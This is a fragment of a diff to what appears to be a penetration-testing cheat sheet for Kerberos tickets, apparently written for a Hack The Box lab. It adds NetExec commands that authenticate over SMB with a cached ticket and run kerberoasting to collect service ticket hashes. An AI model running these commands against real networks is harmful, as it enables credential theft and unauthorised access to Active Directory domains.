@@ -11,6 +11,10 @@ python3 getTGT.py domain.local/user:Password123
 
 export KRB5CCNAME=user.ccache
 klist
+
+nxc smb dc.rustykey.htb --use-kcache
+
+nxc smb dc.rustykey.htb -k -M kerberoasting kerb_hashes
 ```
 
 ## PFX to CCACHE
